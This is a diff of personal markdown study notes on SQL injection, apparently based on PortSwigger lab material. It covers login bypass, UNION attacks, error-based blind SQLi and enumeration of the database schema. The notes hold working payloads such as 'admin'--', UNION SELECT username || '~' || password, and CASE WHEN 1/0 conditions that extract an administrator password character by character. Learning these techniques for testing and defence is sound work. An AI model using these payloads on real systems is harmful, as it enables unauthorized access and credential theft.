@@ -30,13 +30,13 @@ But also
 - `SELECT`, within the table or column name
 - `SELECT`, within the `ORDER BY` clause
 
-## SQLi types based on results
+### SQLi types based on results
 - Retrieving hidden data. Modify SQL query to return additional results
 - Subverting application logic. Change query to interfere with application's logic.
 - UNION attacks. Get data from other tables
 - Blind SQL injection. Results of a query are not returned n the application's responses.
 
-### Retrieving hidden data. 
+## Retrieving hidden data. 
 
 For example we have a shop website that has a search based on a parameter categories. When clicking on any category we send a **GET** request with a parameter `category`.
 e.g. `https://insecure-website.com/products?category=Gifts`
@@ -48,13 +48,13 @@ We can also modify the request a little to `OR 1==1'--`. This would mean then th
 
 **WARNING** `OR 1=1` should be used with caution as it could lead to loss of data if the queries lead to `insert` or `delete`.
 
-### Subverting application logic.
+## Subverting application logic.
 
 For example we have an login form and this SQL is made to check if valid user:
 `SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'`
 As we can see here, if there was an used `admin` we could insert `admin'--` and would get logged in as an administrator. 
 
-### Retrieving data from other database tables (UNION attacks)
+## Retrieving data from other database tables (UNION attacks)
 
 In cases where application returns results of an SQL query, it could be possible to inject an `UNION` query which would retrieve data from another table
 `SELECT name, description FROM products WHERE category = 'Gifts'`
@@ -100,7 +100,7 @@ If the column is not compatible with the data type we would get an error
 `Conversion failed when converting the varchar value 'a' to data type int.`
 If no error is thrown and application's response contains additional content including the injected string value, then the relevant column is suitable for retrieving string data.
 
-### Union attack for retrieving relevant data
+## Union attack for retrieving relevant data
 
 Once we figure out the number of columns and figure out data types for the columns we can try to retrieve interesting data.
 
@@ -114,12 +114,12 @@ So we can inject into `users` table with
 But to perform a `UNION` attack there's the need of knowing the table name and it's column names.
 Fortunate for us, most modern database provide ways to retrieve database structure (tables and column names)
 
-### Multiple values within column
+## Multiple values within column
 
 SQL has syntax for concatenating multiple columns into one when doing `SELECT`
 `' UNION SELECT username || '~' || password FROM users --`
 
-### Blind SQL injection vulnerabilities
+## Blind SQL injection vulnerabilities
 
 Usually queries if something goes wrong no results are returned to indicate an error. They still can be exploited but techniques are more difficult.
 
@@ -139,3 +139,80 @@ Suppose there is a table called `users` with columns `username` and `password` a
 If the servers returns a correct message that could indicate that the password letters matches are somewhere above `m` char. From there we narrow down to the first letter.
 
 [Different databases](https://portswigger.net/web-security/sql-injection/cheat-sheet) use different method name for `substring` 
+
+## Error-based SQLi
+
+It's when errors are used to infer or retrieve sensitive data. Exploit depend on database configuration and types of error we are able to trigger.
+- Inducing the app to return a certain error using a conditional response
+- Or by being able to turn a blind SQLi into visible one. It's when we are able to return data while also triggering an error.
+
+### Blind SQLi exploits triggered by conditional errors
+
+Some applications can carry out any SQL query, but some cause errors that are not handled properly and an conditional response may be triggered by causing and SQL error within an query.
+Let's say our previous example now handles previous errors differently, so now we have to cause an entire SQL error - make an invalid SQL query instead of making conditionals return false.
+So we send a request containing our `TrackingId` and these conditionals in turn
+```sql
+xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
+xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
+```
+The `CASE` keyword tests a condition then if condition return what is after `THEN` if not true returns what is after `ELSE`. So:
+- First condition is always `false` because 1!=2 so it returns 1/0, which should return an error
+- The second condition is `true` so `a` should be returned and it should be equal to what is after conditional select and throw no error 
+And this is how we cause a blind SQLi triggered by conditional errors.
+So like with a previous blind SQLi we can proceed to retrieve usernames and passwords
+`xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`
+In this example we check if `Username` equals to `Administrator` and if the char int value is higher than `m`. If yes - we cause a an SQL error, if not - no SQL error is triggered.
+
+There are different ways to trigger SQL errors withing different SQL database types.
+Refer to this [cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+## Identifying SQL databases
+
+When trying to exploit an application for SQLi it's important to know how to determine what database is being used.
+
+To do that we inject different SQLi queries that fingerprint database.
+
+| Database Type | Query |
+| - | - |
+| Microsoft, MySQL | `SELECT @@version` |
+| Oracle | `SELECT * FROM v$version` |
+| PostgreSQL | `SELECT version()` |
+
+Often it's wise to pair it with an `UNION` attack
+`' UNION SELECT @@version`
+
+## Listing the contents of the database
+
+Databases have a set of views called the information schema, which provides the information about database tables, columns and so on.
+Oracle does not have such feature.
+
+The query for a schema on other databases
+`SELECT * FROM information_schema.tables`
+With an output looking something close to this:
+```sql
+TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
+=====================================================
+MyDatabase     dbo           Products    BASE TABLE
+MyDatabase     dbo           Users       BASE TABLE
+MyDatabase     dbo           Feedback    BASE TABLE
+```
+
+Then after getting table names, we could query for column names:
+`SELECT * FROM information_schema.columns WHERE table_name = 'Users'`
+Result:
+```sql
+TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
+=================================================================
+MyDatabase     dbo           Users       UserId       int
+MyDatabase     dbo           Users       Username     varchar
+MyDatabase     dbo           Users       Password     varchar
+```
+
+## Listing the contents of an Oracle database
+
+On Oracle, you can find the same information as follows:
+You can list tables by querying all_tables:
+`SELECT * FROM all_tables`
+You can google column names, they are usually of string type.
+
+You can list columns by querying all_tab_columns:
+`SELECT * FROM all_tab_columns WHERE table_name = 'USERS'`
